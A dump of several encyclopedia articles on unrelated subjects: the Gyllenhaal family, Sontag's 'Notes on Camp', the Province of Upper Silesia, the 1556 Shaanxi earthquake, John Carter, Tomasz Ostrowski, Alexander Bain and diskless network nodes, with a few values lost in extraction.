The name &quot;Gyllenhaal&quot; originated from Nils Gunnarsson Gyllenhaal&#x27;s father Gunne Olofsson Haal, who was from Hahlegården, a crown homestead in Södra Härene parish in the province of Västergötland in southwestern Sweden. &quot;Haal&quot; comes from the name of the farm estate &quot;Hahlegården&quot;. In the knighthood letter, signed by Queen Christina, the family name was written in two different ways — first &quot;Gyllenhahl&quot; and then &quot;Gyllenhaal&quot;. On the copperplate with his coat of arms now hanging in the House of Nobility (&quot;Riddarhuset&quot;) in Stockholm, it is spelled &quot;Gyllenhahl&quot;. Such ambiguities are typical of the time; it would be several generations before Swedish spelling was more strictly regulated. The prefix &quot;Gyllen&quot; (&quot;Golden&quot;) was the one most used when ennobling someone since the 16th century.

Actor Jake Gyllenhaal, great-great grandson of the below-mentioned Anders Leonard Gyllenhaal, quipped during an interview before the British premiere of &quot;Prince of Persia&quot; that his last name was pronounced &quot;Yil-en-hoo-luh-hay&quot;, parodying Americans&#x27; difficulties with Swedish pronunciation.

== Family history ==
Nils Gunnarsson Gyllenhaal&#x27;s descendants today stem from two of his sons: Lars Gyllenhaal (1645–1710), Lieutenant of the Vestgotha cavalry regiment; and his younger brother Hans Gyllenhaal (1655–1710). Hans was killed in action at the Battle of Helsingborg as a cavalry captain.

The members of the older branch descending from Lars still live in Sweden. The most notable member of that branch was the Minister for Justice Lars Herman Gyllenhaal. In 1851, he was created Knight and Commander of the Royal Order of the Seraphim. His great-great grandson, Baron Herman Gyllenhaal of Härlingstorp (born 1934), is now the head of both branches of the noble family Gyllenhaal. He has a son, Lars.

All the members of the family in the United States are descended from Hans Gyllenhaal through his great great-great grandson Anders Leonard (1842–1905) and his wife Amanda (née Nelson, 1859–1948). Anders Leonard Gyllenhaal emigrated to the United States in 1865. A prominent member of this younger branch thitherto was Leonard Gyllenhaal (1752–1840). In 1807, he was created a Knight of the Royal Order of Vasa for his scientific work as an entomologist, including his monograph on Swedish insects, &quot;Insecta Suecia descripta&quot;.

Matilda was a Spanish countess, born in Milan, Italy. She was first married to the stablemaster of Napoleon I&#x27;s sister; in 1817, widowed, she married J. Montgomery-Cederhjelm in Vienna and became a leading figure and &quot;trendsetter&quot; in Stockholm society. In 1825 she was widowed again; she married a third time in 1839 to Carl Gyllenhaal. She was the subject of a poem by the leading Swedish poet Esaias Tegnér, and a song by Erik Gustaf Geijer; she herself wrote songs and set Tegnér&#x27;s &quot;Rings Drapa&quot; to music.

<text>&quot;Notes on &#x27;Camp&#x27;&quot; is a 1964 essay by Susan Sontag that brought the aesthetic sensibility known as &quot;camp&quot; to mainstream consciousness.

==Background==
&quot;Notes on &#x27;Camp was first published as an essay in 1964, and was her first contribution to the &quot;Partisan Review&quot;. The essay attracted interest in Sontag. 

The essay was republished in 1966 in Sontag&#x27;s debut collection of essays, &quot;Against Interpretation&quot;. The essay considers meanings and connotations of the word &quot;camp&quot;.

==Synopsis==
The essay is structured with a brief introduction, followed by a list of 58 &quot;notes&quot; on what camp is, or might be.

Christopher Isherwood is mentioned in Sontag&#x27;s essay: &quot;Apart from a lazy two-page sketch in Christopher Isherwood&#x27;s novel &quot;The World in the Evening&quot; (1954), [camp] has hardly broken into print.&quot; In Isherwood&#x27;s novel two characters are discussing the meaning of camp, both High and Low. Stephen Monk, the protagonist, says:

You thought it meant a swishy little boy with peroxided hair, dressed in a picture hat and a feather boa, pretending to be Marlene Dietrich? Yes, in queer circles they call &quot;that&quot; camping. … You can call [it] Low Camp…High Camp is the whole emotional basis for ballet, for example, and of course of baroque art … High Camp always has an underlying seriousness. You can&#x27;t camp about something you don&#x27;t take seriously. You&#x27;re not making fun of it, you&#x27;re making fun out of it. You&#x27;re expressing what’s basically serious to you in terms of fun and artifice and elegance. Baroque art is basically camp about religion. The ballet is camp about love …

Then examples are given: Mozart, El Greco and Dostoevsky are camp; Beethoven, Flaubert and Rembrandt are not.

==Legacy==
The 2019 haute couture art exhibit &quot;&quot;, presented by the Anna Wintour Costume Center at New York City&#x27;s Metropolitan Museum of Art, was built around Sontag&#x27;s essay by Andrew Bolton, the Wendy Yu Curator in Charge of the Costume Institute.

<text>The Province of Upper Silesia (; Silesian German: &quot;Provinz Oberschläsing&quot;; ; ) was a province of the Free State of Prussia from 1919 to 1945. It comprised much of the region of Upper Silesia and was eventually divided into two government regions () called &quot;Kattowitz&quot; (1939–1945), and &quot;Oppeln&quot; (1819–1945). The provincial capital was Oppeln (1919–1938) and Kattowitz (1941–1945), while other major towns included Beuthen, Gleiwitz, Hindenburg O.S., Neiße, Ratibor and Auschwitz, added in 1941 (the place of future extermination of Jews in World War II). Between 1938 and 1941 it was reunited with Lower Silesia as the Province of Silesia.

== History ==
===Historical population===
Perhaps the earliest exact census figures on ethnic or national structure of Regierungsbezirk Oppeln (Regierungsbezirk Kattowitz did not yet exist) are from 1819. In 1819 the Oppeln Region had 561,203 inhabitants, including the following &quot;Nationalverschiedenheit&quot;:

:Poles: 377,100 (67,2%)
:Germans: 162,600 (29,0%)
:Moravians: 12,000 (2,1%)
:Jews: 8,000 (1,4%)
:Czechs: 1,600 (0,3%)

The population more than doubled during the next five decades, reaching over 1,2 million inhabitants by year 1867, including around 742 thousand Poles and around 457 thousand Germans. The indigenous Polish population was subjected to Germanisation policies. The last pre-World War I general census figures available, are from 1910 (if not including the 1911 census of school children - Sprachzählung unter den Schulkindern - which revealed a higher percent of Polish-speakers among school children than the 1910 census among the general populace). Large demographic changes took place between 1819 and 1910, with the region&#x27;s total population quadrupling, the percent of German-speakers increasing significantly, and that of Polish-speakers declining considerably. Also the total land area in which Polish was spoken, as well as the land area in which it was spoken by the majority, declined between 1790 and 1890. Polish authors before 1918 estimated the number of ethnic Poles in Prussian Upper Silesia as slightly higher than according to figures from official German censuses.

Exact ethnolinguistic figures for the 19th century and early 20th century can be found in Table 1.:

===Weimar Republic===
From 1919 to 1921 three Silesian Uprisings occurred among the Polish-speaking populace of Upper Silesia; the Battle of Annaberg was fought in the region in 1921. In the Upper Silesia plebiscite of March 1921, 59,4% voted against merging with Poland and 40,6% voted for, with clear lines dividing Polish and German communities. The exact border, the maintenance of cross-border railway traffic and other necessary co-operations, as well as equal rights for all inhabitants in both parts of Upper Silesia, were all fixed by the German-Polish Accord on East Silesia, signed in Geneva on 15 May 1922. On 20 June the Weimar Republic ceded, &quot;de facto&quot;, the eastern parts of Upper Silesia, becoming part of the Silesian Voivodeship of the Second Polish Republic. Within Weimar Germany, the Prussian Province of Silesia was divided into the provinces of Upper Silesia and Lower Silesia The territory remaining in Prussian Upper Silesia was administered within the Oppeln Region and — according to Polish sources — had 530,000 Poles within it.

===Nazi Germany===
After the Nazis&#x27; takeover in Germany, anti-Semitic laws were also introduced in German Upper Silesia, against the &quot;German-Polish Accord on East Silesia&quot; of 1922. Among other stipulations, according to the treaty each contractual party guaranteed in its respective part of Upper Silesia equal civil rights for all the inhabitants. The German Upper Silesian Franz Bernheim succeeded in convincing the League of Nations to force Nazi Germany to abide by the Accord, by filing the Bernheim petition. Accordingly, in September 1933 the Reich&#x27;s Nazi government suspended in German Upper Silesia all anti-Semitic discrimination laws already imposed and excepted the province from all new such future decrees, until the Accord expired in May 1937.

The Polish population was also increasingly persecuted. The first conference of the Nazi anti-Polish organization Bund Deutscher Osten in Upper Silesia was held on 9 June 1933 in Gliwice. A secret &quot;Sicherheitsdienst&quot; report from 1934, mentioned Bytom, Gliwice, Prudnik, Strzelce Opolskie, Zabrze and the Olesno and Opole rural districts as the main centers of the Polish movement in the province. In August 1937, the Germans arrested 31 Polish youth activists.

The Province of Upper Silesia was joined to Lower Silesia to form the Province of Silesia in 1938. The persecution of Poles then further intensified.

====World War II====
After the invasion of Poland in 1939, Polish Upper Silesia, including the Polish industrial city of Katowice, was directly annexed into the Province of Silesia. This annexed territory, also known as East Upper Silesia (&quot;Ostoberschlesien&quot;), became part of the new Regierungsbezirk Kattowitz.

German occupation forces began a policy of repression against the Polish population of eastern Upper Silesia, which started as early as September 1939 based on lists made before the war that pointed out Poles active in social and political life. A second wave of arrests happened during October and November in &quot;Intelligenzaktion Schlesien&quot;, aimed against Polish intellectuals, many of whom perished in prison camps. A third wave of arrests came in April and May 1940 during the AB Aktion.

In Katowice, according to the historian Czesław Madajczyk, one of the harshests centres of oppression was the prison on Mikołowska street where people were reported to be murdered by Germans through the use of guillotine. A prison and penal camp were also established in the region in which Polish activists from Upper Silesia were held.

At the same time, the Polish population was expelled from eastern Upper Silesia; from 1939 until 1942, 40,000 Poles were expelled. In their place, ethnic Germans from Volhynia and the Baltic countries were settled in Upper Silesia&#x27;s urban areas. Until 1943, about 230,000 ethnic Germans were located on the Polish territories of eastern Upper Silesia and the Wartheland. The death toll of the Polish population in Upper Silesia at the hands of Germans is about 25,000 victims, with 20,000 of them being from urban population.
In 1941, the Province of Silesia was again divided into the Provinces of Upper and Lower Silesia; German-occupied Katowice was made the capital of Upper Silesia instead of the smaller city of Oppeln (Opole).

The Germans established and operated a network of &quot;Polenlager&quot; forced labour camps, several subcamps of Auschwitz, and several prisoner-of-war camps, including Stalag VIII-B, Stalag VIII-F, Stalag Luft 7 and Oflag VIII-A, with numerous forced labour subcamps in the province, for Polish, French, Belgian, Dutch, British, Canadian, Australian, American and other Allied POWs.

The German province of Upper Silesia was conquered by the Soviet Red Army from February until the end of March 1945 during World War II&#x27;s Lower and Upper Silesian Offensives. The post-war Potsdam Agreement granted the entire province&#x27;s territory to the People&#x27;s Republic of Poland; the territory is now in the Polish Opole and Silesian Voivodeships. Most Germans remaining in the territory were expelled westward in accordance with the Potsdam Agreement. The Landsmannschaft Schlesien represents German Silesians from Upper and Lower Silesia. Near and in Opole, a German minority remains.

Upper Silesia was known to be a poor, but heavily industrialised and polluted area. This was one of the Areas that P. G. Wodehouse was sent to after he was captured in the North of France as an Enemy Alien. He was said to have commented on the state of the area &quot;If this is Upper Silesia, one has to wonder what Lower Silesia is like.&quot;

=== Post-war period ===
During the Polish post-war census of December 1950, data about the pre-war places of residence of the inhabitants as of August 1939 was collected. In case of children born between September 1939 and December 1950, their origin was reported based on the pre-war places of residence of their mothers. Thanks to this data it is possible to reconstruct the pre-war geographical origin of the post-war population. The same territory corresponding to pre-1938 Province of Upper Silesia (which became part of Poland in 1945) was inhabited as of December 1950 by:

Before the war, German Upper Silesia was home to a very large ethnically Polish/Silesian minority in Germany, so the flight and expulsion of Germans did not affect the region as much. In 1950, most of the region&#x27;s population were its autochthons, who had had German citizenship before World War II, and were granted Polish citizenship after 1945. There were also many newcomers, especially from Eastern Poland annexed by the USSR and from pre-war Polish Upper Silesia.

<text>The 1556 Shaanxi earthquake (Postal romanization: &quot;Shensi&quot;), known in Chinese colloquially by its regnal year as the Jiajing Great Earthquake &quot;&quot; (&quot;Jiājìng Dàdìzhèn&quot;) or officially by its epicenter as the Hua County Earthquake &quot;&quot; (&quot;Huàxiàn Dìzhèn&quot;), occurred in the early morning of 2 February 1556 in Huaxian, Shaanxi, during the Ming dynasty.

Most of the residents there lived in yaodongs—artificial caves in loess cliffs—which collapsed and buried alive those sleeping inside. Modern estimates by China Earthquake Administration&#x27;s publications put the direct deaths from the earthquake at roughly 100,000, while over 700,000 either migrated away or died from famine and plagues, which summed up to a total reduction of 830,000 people in Imperial &quot;hukou&quot; registration. It is one of the deadliest earthquakes and one of the deadliest natural disasters in Chinese history.

==Tectonic setting==
Huaxian lies within the Weihe Basin, one of the rift basins that form the southern and eastern boundaries of the Ordos Block. To the east the basin is continuous with the Shanxi Rift System. The Weihe basin formed during the Paleogene in response to northwest–southeast directed extension. Following a tectonically quiet period during the late Paleogene the rift basins became active again in the Neogene in response to NNW–SSE directed extension, activity that continues to the present. The basins in the Weihe-Shanxi Rift System are bounded by large normal faults, which have been responsible for large historical earthquakes. The Weihe Basin has an overall half-graben geometry, with the main controlling faults, such as the Huashan Fault and North Qinling Fault, forming the southern boundary.

==Earthquake==
The epicenter was in the Wei River Valley in Shaanxi Province, near Huaxian (now Huazhou District of Weinan), Weinan and Huayin. Huaxian was completely destroyed, killing more than half the residents of the city, with an estimated death toll in the hundreds of thousands. The situation in Weinan and Huayin was similar. In certain areas, crevices opened in the earth. Destruction and death were widespread, affecting places as far as from the epicenter. The earthquake also triggered landslides, which contributed to the massive death toll.
The rupture occurred during the reign of the Jiajing Emperor of the Ming dynasty. Therefore, in the Chinese historical record, this earthquake is often referred to as the Jiajing Great Earthquake.

In the annals of China it was described in this manner:
The earthquake damaged many of the Forest of Stone steles badly. Of the 114 Kaicheng Stone Classics, 40 were broken in the earthquake.

The scholar Qin Keda lived through the earthquake and recorded details. One conclusion he drew was that &quot;at the very beginning of an earthquake, people indoors should not go out immediately. Just crouch down and wait. Even if the nest has collapsed, some eggs may remain intact.&quot; The shaking reduced the height of the Small Wild Goose Pagoda in Xi&#x27;an by three levels.

==Geology==
Modern estimates, based on geological data, give the earthquake a magnitude of approximately 8 Mw on the moment magnitude scale and XI (catastrophic damage) on the Mercalli scale, though more recent discoveries have shown that it was more likely 7.9 Mw. While it was the deadliest earthquake and the third-deadliest natural disaster in history, there have been earthquakes with considerably higher magnitudes. Following the earthquake, aftershocks continued several times a month for half a year.

Shaking was felt strongly across the Weihe Basin region. The maximum China seismic intensity was XI to XII occurring in Huaxian and Weinan. This would support the theory of the earthquake rupturing along the Huashan and Weinan faults. Intensity VIII was observed throughout the basin and the intensity X+ zone was long.

Studies about the earthquake published between 1998 and 2017 presumed scarps along the Huashan and Weinan faults, some higher than , were produced by the 1556 earthquake. The fault zone is located northeast of Xi&#x27;an. This normal fault generally trends east–west and dips to the north. A 1995 study said scarps along the Huashan Fault were high. Near the town of Huashan, the fault terrace contained Yangshao culture artefacts which were 4,000 years old. In a separate 1998 study, the fault scarps were about high. Scarps of the Weinan Fault are less detailed in published works with most focused around the Chishui River area. Two studies in 1992 and 2010 estimated the fault scarps at and respectively. There has not been any research to confirm these scarps were produced by the earthquake or formed by multiple events. Assuming both faults ruptured during the earthquake, which runs for a total , the would be 7.0–7.5, according to empirical scaling relationships between magnitude and fault rupture length. This suggest previous values for the earthquake&#x27;s magnitude were overestimated.

==Affected area==
More than 97 counties in the provinces of Shaanxi, Shanxi, Henan, Gansu, Hebei, Shandong, Hubei, Hunan, Jiangsu and Anhui were affected. Buildings were damaged slightly in the cities of Beijing, Chengdu and Shanghai. An area was destroyed, and in some counties as much as 60% of the population was killed. The cost of damage done by the earthquake is almost impossible to measure in modern terms.

==Death toll==
Modern estimates by China Earthquake Administration&#x27;s publications put the direct deaths from the earthquake to be roughly 100,000, while 730,000 either migrated away or died from famine and plagues, which summed up to a total reduction of 830,000 people in Imperial &quot;hukou&quot; registration. However, the CEA did not explain how it estimated the number of direct deaths to be 100,000. 

As the CEA did not estimate the total deaths (including subsequent famine and plagues), a handful of CEA staff scientists gave their own estimates, such as 450,000 or 530,000. Whatever the number may be, it is one of the deadliest earthquakes in China, in turn making it one of the top disasters in China by death toll.

Millions of people at the time lived in yaodongs—artificial loess caves—on high cliffs in the Loess Plateau. Much of the population in some of the affected areas lived in yaodongs. This was a major contributing factor to the very high death toll. The earthquake collapsed many caves and caused landslides which destroyed many more.

==Foreign reaction==
The Portuguese Dominican friar Gaspar da Cruz, who visited Guangzhou later in 1556, heard about the earthquake, and later reported about it in the last chapter of his book &quot;A Treatise of China&quot; (1569). He viewed the earthquake as a possible punishment for people&#x27;s sins, and the Great Comet of 1556 as, possibly, the sign of this calamity (as well as perhaps the sign of the birth of the Antichrist).

<text>John Wallace Carter (September 24, 1929 – March 31, 1991) was an American jazz clarinet, saxophone, and flute player. He is noted for the acclaimed &quot;Roots and Folklore&quot; series, a five-album concept album set inspired by African American life and experiences.

==Biography==
Born in Fort Worth, Texas, Carter attended I.M. Terrell High School, and played music with schoolmates Ornette Coleman and Charles Moffett in the 1940s.

Carter earned a Bachelor of Arts from Lincoln University in Jefferson, Missouri in 1949, and a Master of Arts from the University of Colorado in 1956. He also studied at the North Texas State and University of California at Los Angeles.

From 1961, Carter was based mainly on the West Coast. There he met Bobby Bradford in 1965, with whom he subsequently worked on a number of projects, notably the New Jazz Art Ensemble. He also played with Hampton Hawes and Harold Land. In the 1970s Carter became well known on the basis of his solo concerts. At New Jazz Festival Moers in 1979, he and the German clarinet player Theo Jörgensmann performed on three days. Afterwards Carter received complimentary reviews and wide recognition from around the world. He and Jörgensmann met again in 1984. The program of the Berlin JazzFest was built around the clarinet. After Carter&#x27;s solo performance, he and Jörgensmann also played together.

Between 1982 and 1990, Carter composed and recorded &quot;Roots and Folklore: Episodes in the Development of American Folk Music&quot;, five albums focused on African Americans and their history. The complete set was acclaimed by jazz critics as containing some of the best releases of the 1980s.

A clarinet quartet with Perry Robinson, Jörgensmann and Eckard Koltermann was planned for 1991, but Carter did not recover from a non-malignant tumor. Later that year he was inducted into the &quot;Down Beat&quot; Jazz Hall of Fame.

<text>Count Tomasz Adam Ostrowski (21 December 1735 – 5 February 1817) was a Polish nobleman (szlachcic), politician, spokesman, statesman and &quot;Count&quot; since 1798.

Tomasz became Colonel of the Crown Army in 1765, Chamberlain of King Stanisław II Augustus in 1767, castellan of Czersk since 1777, Court Treasurer since 1791, Marshal of the Sejm of the Duchy of Warsaw in 1809 and later President of the Senate of the Duchy of Warsaw and the Kingdom of Poland.

He was a member of the Permanent Council (Rada Nieustająca), and an opponent of the Targowica Confederation. He was a member of the &quot;Zgromadzenie Przyjaciół Konstytucji Rządowej&quot; (Friends of the 3 May Constitution). He was politically tied to King Stanisław II Augustus, and he also participated in the &quot;Thursday dinners&quot; held annually by the king in his palace in Warsaw.

He was the founder of Tomaszów Mazowiecki

==Biography==
Son of Piotr Ostrowski and Konstancja Stoińska. In 1765 he married Józefa Godlewska, with whom he had a daughter Julia. After the death of Józefa in 1780 he married Apolonia Ledóchowska (in 1781), with whom he had nine children most notably Antoni Jan Ostrowski, General Commander of the National Guard during the November Uprising and Władysław Ostrowski, Marshal of the Sejm of the Polish Kingdom in 1830. After the death of his second wife in 1795, Ostrowski married Apolonia Kunegunda Brzozowska.

In 1764 he supported the election of King Stanisław II Augustus. A true hero of the country, he restrained the king from accession to the Targowica Confederation and he was subsequently imprisoned by the Russians. In 1765, was a colonel in the royal army and became royal chamberlain in 1767. Ostrowski was Member of the Confederation of Andrzej Mokronowski in 1776. Ostrowski became the castellan of Czersk in 1777. In the years 1776, 1778, 1782 and 1786 he was a member of the Permanent Council. In 1788 he founded the metallurgical village of Tomaszowe Kuźnice, which was granted the status of an industry and trade village (&quot;osada fabryczno-handlowa&quot;) in 1824, designated a city in 1830 and was renamed to Tomaszów Mazowiecki. He was a member of the Four-year Sejm. In 1791 he was proclaimed the Treasurer of the Crown. He was one of the founders of the Friends of the Constitution Assembly Government. During the Polish-Russian war, at the meeting of 23 July 1792 he strongly opposed the decision of King Stanisław II Augustus on his accession to the Confederation of Targowica and he enhanced to revolt against the Russians and the administration which had control over the Polish–Lithuanian Commonwealth. Later he became the Marshal of the Sejm of the Duchy of Warsaw in 1809 and later President of the Senate of the Duchy of Warsaw and the Kingdom of Poland.

He died on 5 February 1817 in Warsaw.

<doc id="1341253" wikidata="Q524036" url="?curid=1341253" title="Alexander Bain (inventor)">
<text>Alexander Bain (12 October 1810 – 2 January 1877) was a Scottish inventor and engineer who was first to invent and patent the electric clock. He installed the railway telegraph lines between Edinburgh and Glasgow.

==Early life==
Bain was born in Leanmore, near Watten, Caithness, Scotland. He was baptised in the local kirk on 22 November 1810. His father was a crofter. He had a twin sister, Margaret, and, in total, he had six sisters and six brothers. Bain did not excel in school and was apprenticed to a clockmaker in Wick.

==Career==

Having learned the art of clockmaking, he went to Edinburgh, and in 1837 to London, where he obtained work as a journeyman in Clerkenwell. Bain frequented the lectures at the Polytechnic Institution and the Adelaide Gallery and later constructed his own workshop in Hanover Street.

===Electric clocks and Railway Telegraphs===
In 1840, desperate for money to develop his inventions, Bain mentioned his financial problems to the editor of the Mechanics Magazine, who introduced him to Sir Charles Wheatstone. Bain demonstrated his models to Wheatstone, who, when asked for his opinion, said &quot;Oh, I shouldn&#x27;t bother to develop these things any further! There&#x27;s no future in them.&quot; Three months later Wheatstone demonstrated an electric clock to the Royal Society, claiming it was his own invention. However, Bain had already applied for a patent for it. Wheatstone tried to block Bain&#x27;s patents, but failed. When Wheatstone organised an Act of Parliament to set up the Electric Telegraph Company, the House of Lords summoned Bain to give evidence, and eventually compelled the company to pay Bain £10,000 and give him a job as manager, causing Wheatstone to resign.

Bain&#x27;s first patent was dated 11 January 1841, and was in the names of John Barwise, chronometer maker, and Alexander Bain, mechanist. It describes his electric clock which uses a pendulum kept moving by electromagnetic impulses. He improved on this in later patents, including a proposal to derive the required electricity from an &quot;earth battery&quot;, which consisted of plates of zinc and copper buried in the ground.

In December 1841, Bain in conjunction with Lieutenant Thomas Wright RN, patented a method for using electricity to control railway engines by turning off steam, marking time, giving signals, and printing information at different locations. The most significant idea incorporated in the patent was his plan for inverting the needle telegraph earlier developed by Ampère, Wheatstone and others: instead of making signals by a pivoted magnetic needle under the influence of an electromagnet, he made them by suspending a movable coil between the poles of a fixed magnet. A similar concept appears in Sir William Thomson&#x27;s siphon recorder. Bain also proposed to make the coil record messages by printing them, an idea he developed further in a subsequent patent. Bain&#x27;s telegraph was first used in December 1845 on the Edinburgh and Glasgow Railway which had opened in 1842. In January 1846 he convinced the directors of the Stockton and Darlington Railway to install his telegraph between the north and south ends of their Shildon tunnel. These instruments remained in use until September 1865 (and still survive, see below). His telegraph was also successful abroad: &quot;The initial Austrian Bain instruments were made by Johann Michael Ekling in Vienna, and later by the k.k. Telegraphenwerkstätte Wien, the Imperial Royal Telegraph Workshops Vienna.&quot;
&quot;For many years I have devoted myself to rendering electricity practically useful, and have been extensively engaged, not only in this country, but in America and on the Continent, in the construction and working of the Electric Telegraph; while at the same time, the employment of electricity in the measurement of time has also engaged my attention.&quot;

Alexander Bain, &quot;A Short History of the Electric Clocks&quot;
====Surviving examples====
Bain&#x27;s extant electric clocks come from two stages of development between the 1840s and the 1860s. Examples can be seen in Watten&#x27;s Village Hall, the National Museum of Scotland, the National Maritime Museum of London, the London Science Museum and the Deutsches Uhrenmuseum. The most rare and interesting mantel clocks are in private hands. One featured in the &quot;Electrifying Time&quot; exhibition in 1977 at the London Science Museum. Bain sometimes found complex and ornate solutions to relatively simple, although not easy to solve problems. The most complex, his mantel clock, worked on an electro-magnetic pull push, pull push for each complete period of swing employing a pendulum with opposing magnetic fields. At a very similar time, Matthäus Hipp constructed a more simple and reliable system which used a simple toggle switch to impulse the pendulum every so often.

One of Bain&#x27;s telegraph instruments is on display at the National Museum of Scotland, probably from the Edinburgh and Glasgow Railway. The two instruments used by the Stockton and Darlington Railway at Shildon tunnel are in the National Railway Museum collection. One of Bain&#x27;s printing telegraphs from 1843 is in the collection of the Museum für Kommunikation Frankfurt. The Shildon instruments were also provided with single-stroke bells, the hammers of which were held up by &#x27;trip gear&#x27; which was released by the first electrical pulse to deflect the needle; upon completion of the message exchange the hammer then had to be raised again by hand. If the operator failed to hear the single ring, there was no method of repeating it – only the movement of the needle could be observed.

===Facsimile machine===

 Bain worked on an experimental fax machine from 1843 to 1846. He used a clock to synchronise the movement of two pendulums for line-by-line scanning of a message. For transmission, Bain applied metal pins arranged on a cylinder made of insulating material. An electric probe that transmitted on-off pulses then scanned the pins. The message was reproduced at the receiving station on electrochemically sensitive paper impregnated with a chemical solution similar to that developed for his chemical telegraph. In his patent description dated 27 May 1843 for &quot;improvements in producing and regulating electric currents and improvements in timepieces, and in electric printing, and signal telegraphs,&quot; he claimed that &quot;a copy of any other surface composed of conducting and non-conducting materials can be taken by these means&quot;. The transmitter and receiver were connected by five wires. In 1850 he applied for an improved version but was too late, as Frederick Bakewell had obtained a patent for his superior &quot;image telegraph&quot; two years earlier in 1848.

Bain&#x27;s and Bakewell&#x27;s laboratory mechanisms reproduced poor quality images and were not viable systems because the transmitter and receiver were never truly synchronized. In 1861, the first practical operating electro-mechanical commercially exploited telefax machine, the Pantelegraph, was invented by the Italian physicist Giovanni Caselli. He introduced the first commercial telefax service between Paris and Lyon at least 11 years before the invention of workable telephones.

===Chemical telegraph===
On 12 December 1846, Bain, who was then living in Edinburgh, patented a chemical telegraph. He had seen that the Morse and other telegraphs then in use were comparatively slow, due to the mechanical inertia of their moving parts, and realized that the signal current could be used to make a readable mark on a moving paper tape soaked in a mixture of ammonium nitrate and potassium ferrocyanide, which gave a blue mark when a current was passed through it.

The speed at which marks could be made on the paper was so high that hand signalling could not keep up with it, and so Bain devised a method of automatic signalling using punched paper tape. The concept was later used by Wheatstone in his automatic sender. Bain&#x27;s chemical telegraph was tried between Paris and Lille, and attained a speed of 282 words in 52 seconds, a great advance on Morse&#x27;s telegraph which could only give about 40 words per minute.

In England Bain&#x27;s telegraph was used on the wires of the Electric Telegraph Company to a limited extent, and in 1850 it was used in America by Henry O&#x27;Reilly. However, it incurred the hostility of Samuel Morse, who obtained an injunction against it on the grounds that the paper tape and alphabet used fell under his patent. Consequently, by 1859 Bain&#x27;s telegraph was in use on only one line and never really entered general usage.

==Later life==
Initially Bain made a considerable sum from his inventions but lost his wealth in poor investments. In 1873, Sir William Thomson, Sir William Siemens, Latimer Clark and others obtained a Civil List pension for Bain from Prime Minister William Ewart Gladstone of £80 per year.

==Death and legacy==

Bain was buried in the Auld Aisle Cemetery, Kirkintilloch. It was restored in 1959. The headstone initially had an incorrect year of death (1876) which was later corrected to 1877. JD Wetherspoons pub in Wick, close to where Alexander Bain served his apprenticeship, is now named &#x27;The Alexander Bain&#x27; after the inventor. Also, as a tribute to his inventions, the main BT building in Glasgow is named Alexander Bain House. One of the earliest examples of an electrically impulsed pendulum clock is on display at the Deutsches Uhrenmuseum.

In 2016, he was posthumously awarded the Technology &amp; Engineering Emmy Award &quot;for his pioneering work in the transmission of images&quot;. The statuette is on display in Kirkintilloch Town Hall.

<text>A diskless node (or diskless workstation) is a workstation or personal computer without disk drives, which employs network booting to load its operating system from a server. (A computer may also be said to &quot;act as a diskless node&quot;, if its disks are unused and network booting is used.)

Diskless nodes (or computers acting as such) are sometimes known as &quot;network computers&quot; or hybrid clients. &quot;Hybrid client&quot; may either just mean diskless node, or it may be used in a more particular sense to mean a diskless node which runs &quot;some&quot;, but not all, applications remotely, as in the thin client computing architecture.

Advantages of diskless nodes can include lower production cost, lower running costs, quieter operation, and manageability advantages (for example, centrally managed software installation).

In many universities and in some large organizations, PCs are used in a similar configuration, with some or all applications stored remotely but executed locally—again, for manageability reasons. However, these are not diskless nodes if they still boot from a local hard drive.

==Distinction between diskless nodes and centralized computing==

Diskless nodes process data, thus using their own CPU and RAM to run software, but do not store data persistently—that task is handed off to a server. This is distinct from thin clients, in which all significant processing happens remotely, on the server—the only software that runs on a thin client is the &quot;thin&quot; (i.e. relatively small and simple) client software, which handles simple input/output tasks to communicate with the user, such as drawing a dialog box on the display or waiting for user input.

A collective term encompassing both thin client computing, and its technological predecessor, text terminals (which are text-only), is centralized computing. Thin clients and text terminals can both require powerful central processing facilities in the servers, in order to perform all significant processing tasks for all of the clients.

Diskless nodes can be seen as a compromise between fat clients (such as ordinary personal computers) and centralized computing, using central storage for efficiency, but not requiring centralized processing, and making efficient use of the powerful processing power of even the slowest of contemporary CPUs, which would tend to sit idle for much of the time under the centralized computing model.

==Principles of operation==

The operating system (OS) for a diskless node is loaded from a server, using network booting. In some cases, removable storage may be used to initiate the bootstrap process, such as a USB flash drive, or other bootable media such as a floppy disk, CD or DVD. However, the firmware in many modern computers can be configured to locate a server and begin the bootup process automatically, without the need to insert bootable media.

For network auto-booting, the Preboot Execution Environment (PXE) or Bootstrap Protocol (BOOTP) network protocols are commonly used to find a server with files for booting the device. Standard full-size desktop PCs are able to be network-booted in this manner with an add-on network card that includes a Universal Network Device Interface boot ROM. Diskless network booting is commonly a built-in feature of desktop and laptop PCs intended for business use, since it can be used on an otherwise disk-booted standard desktop computer to remotely run diagnostics, to install software, or to apply a disk image to the local hard drive.

After the bootstrapping process has been initiated, as described above, bootstrapping will take place according to one of three main approaches.

*In the first approach (used, for example, by the Linux Terminal Server Project), the kernel is loaded into memory and then the rest of the operating system is accessed via a network filesystem connection to the server. (A small RAM disk may be created to store temporary files locally.) This approach is sometimes called the &quot;NFS root&quot; technique when used with Linux or Unix client operating systems.
*In the second approach, the kernel of the OS is loaded, and part of the system&#x27;s memory is configured as a large RAM disk, and then the remainder of the OS image is fetched and loaded into the RAM disk. This is the implementation that Microsoft has chosen for its Windows XP Embedded remote boot feature.
*In the third approach, disk operations are virtualized and are actually translated into a network protocol. The data that is usually stored in a disk drive are then stored in virtual disks files homed on a server. The disk operations such as requests to read/write disk sectors are translated into corresponding network requests and processed by a service or daemon running on the server side. This is the implementation that is used by Neoware Image Manager, Ardence, VHD Central Management System and various &quot;boot over iSCSI&quot; products. This third approach differs from the first approach because what is remote is not a file system but actually a disk device (or raw device) and that the client OS is not aware that it is not running off a hard disk. This is why this approach is sometimes named &quot;Virtual Hard Disk&quot; or &quot;Network Virtual Disk&quot;.
This third approach makes it easier to use client OS than having a complete disk image in RAM or using a read-only file system. In this approach, the system uses some &quot;write cache&quot; that stores every data that a diskless node has written. This write cache is usually a file, stored on a server (or on the client storage if any). It can also be a portion of the client RAM. This write cache can be persistent or volatile. When volatile, all the data that has been written by a specific client to the virtual disk are dismissed when said client is rebooted, and yet, user data can remain persistent if recorded in user (roaming) profiles or home folders (that are stored on remote servers). The two major commercial products (the one from Hewlett-Packard, and the other one from Citrix Systems) that allow the deployment of Diskless Nodes that can boot Microsoft Windows or Linux client OS use such write caches. The Citrix product cannot use persistent write cache, but VHD and HP product can.
== Diskless Windows nodes ==

